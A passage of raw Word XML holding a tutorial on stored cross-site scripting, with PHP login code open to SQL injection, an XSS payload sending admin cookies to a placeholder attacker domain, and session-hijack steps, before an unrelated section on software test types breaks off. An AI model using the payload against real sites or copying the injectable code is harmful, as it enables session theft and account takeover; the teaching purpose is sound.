        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="457" w:lineRule="atLeast"/>
        <w:ind w:left="457"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
        </w:rPr>
        <w:t>When “Admin” log-in, he can see the list of usernames. When “Normal” users log-in, they can only update their display name.</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login.php:</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&lt;?php</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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$Host= '192.168.1.8';</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$Dbname= 'app';</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$User= 'yyy';</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$Password= 'xxx';</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$Schema = 'test';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$Conection_string="host=$Host dbname=$Dbname user=$User password=$Password";</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Connect</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> with database asking for a new connection*/</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$Connect=pg_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>connect(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>$Conection_string,$PGSQL_CONNECT_FORCE_NEW);</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Error checking the connection string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if</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (!$Connect)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"Database Connection Failure";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exit</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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$query="SELECT user_name</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>,password</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> from $Schema.members where user_name='".$_POST['user_name']."';";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$result=pg_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>query(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>$Connect,$query);</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$row=pg_fetch_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>array(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>$result,NULL,PGSQL_ASSOC);</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$user_pass = </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>md5(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>$_POST['pass_word']);</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lastRenderedPageBreak/>
        <w:t>$user_name = $</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>row[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>'user_name'];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if(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>strcmp($user_pass,$row['password'])!=0)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"Login failed";</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else</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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 Start the session</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session_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>start(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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$_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>SESSION[</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>'USER_NAME'] = $user_name;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echo "&lt;head&gt; &lt;</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>meta</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> http-equiv=\"Refresh\" content=\"0;url=home.php\" &gt; &lt;/head&gt;";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home.php:</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lastRenderedPageBreak/>
        <w:t>&lt;?php</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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session_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>start(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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if(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>!$_SESSION['USER_NAME'])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"Need to login";</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proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>else</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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$Host= '192.168.1.8';</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$Dbname= 'app';</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$User= 'yyy';</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$Password= 'xxx';</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$Schema = 'test';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$Conection_string="host=$Host dbname=$Dbname user=$User password=$Password";</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$Connect=pg_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>connect(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>$Conection_string,$PGSQL_CONNECT_FORCE_NEW);</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if(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>$_SERVER['REQUEST_METHOD'] == "POST")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lastRenderedPageBreak/>
        <w:t xml:space="preserve">  $query="update $Schema.members set display_name='"</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.$</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>_POST['disp_name']."' where user_name='".$_SESSION['USER_NAME']."';";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pg_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>query(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>$Connect,$query);</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"Update Success";</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else</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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if(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>strcmp($_SESSION['USER_NAME'],'admin')==0)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"Welcome admin&lt;br&gt;&lt;hr&gt;";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"List of user's are&lt;br&gt;";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$query = "select display_name from $Schema.members where user_name</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>!=</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>'admin'";</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$res = pg_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>query(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>$Connect,$query);</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while(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>$row=pg_fetch_array($res,NULL,PGSQL_ASSOC))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"$row[display_name]&lt;br&gt;";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lastRenderedPageBreak/>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roofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>else</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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echo "&lt;form name=\"tgs\" id=\"tgs\" method=\"post\" action=\"home.php\"&gt;";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"Update display name:&lt;input type=\"text\" id=\"disp_name\" name=\"disp_name\" value=\"\"&gt;";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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>echo</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> "&lt;input type=\"submit\" value=\"Update\"&gt;";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 xml:space="preserve"> }</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Now the attacker log-in as a normal user, and he will enter the following in the textbox as his display name:</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&lt;a href=# onclick=\"document.location=\'http://not-real-xssattackexamples.com/xss.php?c=\'+escape</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>\(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>document.cookie\)\;\"&gt;My Name&lt;/a&gt;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The above information entered by the attacker will be stored in the database (persistent).</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lastRenderedPageBreak/>
        <w:t>Now, when the admin log-in to the system, he will see a link named “My Name” along with other usernames. When admin clicks the link, it will send the cookie which has the session ID, to the attacker’s site. Now the attacker can post a request by using that session ID to the web server, and he can act like “Admin” until the session is expired. The cookie information will be something like the following:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009462E1" w:rsidRPr="00584E67" w:rsidRDefault="009462E1" w:rsidP="009462E1">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:pBdr>
          <w:top w:val="single" w:sz="6" w:space="11" w:color="DDDDDD"/>
          <w:left w:val="single" w:sz="6" w:space="11" w:color="DDDDDD"/>
          <w:bottom w:val="single" w:sz="6" w:space="11" w:color="DDDDDD"/>
          <w:right w:val="single" w:sz="6" w:space="11" w:color="DDDDDD"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="EEEEEE"/>
        <w:spacing w:after="457" w:line="457" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>xss.php</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>?c</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>=PHPSESSID%3Dvmcsjsgear6gsogpu7o2imr9f3</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Once the hacker knows the PHPSESSID, he can use this session to get the admin privilege until PHPSESSID expires.</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To understand this more, we can use a firefox addon called “Tamper Data”, which can be used to add a new HTTP header called “Cookies” and set the value to “PHPSESSID=vmcsjsgear6gsogpu7o2imr9f3″.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009462E1" w:rsidRPr="00584E67" w:rsidRDefault="009462E1" w:rsidP="009462E1">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="457" w:afterAutospacing="0" w:line="457" w:lineRule="atLeast"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>We’ll cover how to use “Tamper Data” in future article of this series.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="004E3A7C" w:rsidP="004E3A7C">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:line="486" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Software Test Types:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="004E3A7C" w:rsidP="004E3A7C">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:line="486" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Test types are introduced as a means of clearly defining the objective of a certain level for a program or project. </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:eastAsiaTheme="majorEastAsia"/>
          <w:color w:val="333333"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="333333"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>A test type is focused on a particular test objective, which could be the testing of the function to be performed by the component or system; a non-functional quality characteristics, such as reliability or usability; the structure or architecture of the component or system; or related to changes, i.e confirming that defects have been fixed (confirmation testing or retesting) and looking for unintended changes (regression testing). Depending on its objectives, testing will be organized differently. Hence there are four software test types:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="00B84F48" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="486" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId23" w:tooltip="What is functional testing" w:history="1">
        <w:r w:rsidR="004E3A7C" w:rsidRPr="00584E67">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="CF4344"/>
          </w:rPr>
          <w:t>Functional testing</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="00B84F48" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="486" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId24" w:tooltip="What is non functional testing" w:history="1">
        <w:r w:rsidR="004E3A7C" w:rsidRPr="00584E67">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="CF4344"/>
          </w:rPr>
          <w:t>Non-functional testing</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="00B84F48" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="486" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId25" w:tooltip="What is structural testing" w:history="1">
        <w:r w:rsidR="004E3A7C" w:rsidRPr="00584E67">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="CF4344"/>
          </w:rPr>
          <w:t>Structural testing</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="004E3A7C" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="486" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>Change related testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="004E3A7C" w:rsidP="004E3A7C">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="457" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="004E3A7C" w:rsidRPr="00584E67" w:rsidRDefault="004E3A7C" w:rsidP="004E3A7C">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="457" w:lineRule="atLeast"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>he</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t xml:space="preserve"> techniques used for functional testing are often specification-based. Testing functionality can be done from two </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>perspective</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
